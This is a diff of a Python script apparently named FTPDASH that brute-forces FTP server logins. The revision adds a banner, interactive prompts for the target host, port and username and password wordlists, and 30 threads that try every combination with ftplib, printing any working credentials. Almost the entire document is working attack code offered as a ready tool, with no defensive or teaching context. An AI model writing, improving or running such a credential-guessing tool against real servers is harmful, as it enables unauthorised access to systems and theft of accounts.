@@ -1,67 +1,83 @@
 import ftplib
 from threading import Thread
 import queue
-from colorama import Fore, init
+from termcolor import colored
 
-# init the console for colors (for Windows)
-init()
+print (colored('''
 
-# initialize the queue
+███████╗████████╗██████╗░██████╗░░█████╗░░██████╗██╗░░██╗
+██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██║░░██║
+█████╗░░░░░██║░░░██████╔╝██║░░██║███████║╚█████╗░███████║
+██╔══╝░░░░░██║░░░██╔═══╝░██║░░██║██╔══██║░╚═══██╗██╔══██║
+██║░░░░░░░░██║░░░██║░░░░░██████╔╝██║░░██║██████╔╝██║░░██║
+╚═╝░░░░░░░░╚═╝░░░╚═╝░░░░░╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝
+                           Developed By Entity.Network 
+                           
+
+''', "red" ))
+
+
 q = queue.Queue()
-# number of threads to spawn
-n_threads = 40
-# hostname or IP address of the FTP server
-host = "192.168.1.2"
-# username of the FTP server, root as default for linux
-user = "root"
-# port of FTP, aka 21
-port = 9000
-# keep track of whether the correct password has been found or not
-password_found = False
+n_threads = 30
+host = input(colored("[!] Enter Ftp server Ip Address : ", "blue" ))
+port = int(input(colored("[!] Enter Ftp server port: ", "blue")))
+username_file = input(colored("[!] Enter the path to the file containing usernames (press enter to skip): ", "blue" ))
+if username_file:
+    with open(username_file) as f:
+        usernames = f.read().split("\n")
+else:
+    username = input(colored("[!] Enter the username: ", "blue" ))
+    usernames = [username]
+
+password_file = input(colored("[!] Enter the path to the file containing passwords: ", "blue" ))
+passwords = open(password_file).read().split("\n")
+print("[+] Passwords to try:", len(passwords))
+
+credentials_found = False
 
 def connect_ftp():
-    global q, password_found
-    while not q.empty() and not password_found:
-        # get the password from the queue
-        password = q.get()
-        # initialize the FTP server object
+    global q, credentials_found
+    while True:
+                
+        password, username = q.get()
+        
+        print("[!] Trying", username, password)
         server = ftplib.FTP()
-        print("[!] Trying", password)
         try:
-            # tries to connect to FTP server with a timeout of 5
+            
             server.connect(host, port, timeout=5)
-            # login using the credentials (user & password)
-            server.login(user, password)
-            # correct credentials
-            print(f"{Fore.GREEN}[+] Found credentials: ")
-            print(f"\tHost: {host}")
-            print(f"\tUser: {user}")
-            print(f"\tPassword: {password}{Fore.RESET}")
-            # set the password_found variable to True to stop other threads from running
-            password_found = True
+            
+            server.login(username, password)
         except ftplib.error_perm:
-            # login failed, wrong credentials
+            
             pass
-        except Exception as e:
-            print(f"[!] Exception: {e}")
+        else:
+            
+            print(colored(f"[+] Found credentials: ", 'green' ))
+            print(colored(f"\tHost: {host}", 'green'))
+            print(colored(f"\tUser: {username}", 'green'))
+            print(colored(f"\tPassword: {password}", 'green'))
+            credentials_found = True
+            
+            break
         finally:
-            # close the FTP server connection
-            server.close()
-            # notify the queue that the task is completed for this password
             q.task_done()
 
 
-# read the wordlist of passwords
-passwords = open("wordlist.txt").read().split("\n")
-print("[+] Passwords to try:", len(passwords))
-# put all passwords to the queue
-for password in passwords:
-    q.put(password)
-# create `n_threads` that runs that function
+for username in usernames:
+    for password in passwords:
+        q.put((password, username))
+
 for t in range(n_threads):
     thread = Thread(target=connect_ftp)
-    # will end when the main thread end
     thread.daemon = True
     thread.start()
-# wait for the queue to be empty
+
+
 q.join()
+
+if credentials_found:
+    print(colored("[+] Credentials found.", 'green'))
+else:
+    print(colored("[!] No username/password combination was found.", 'red'))
+
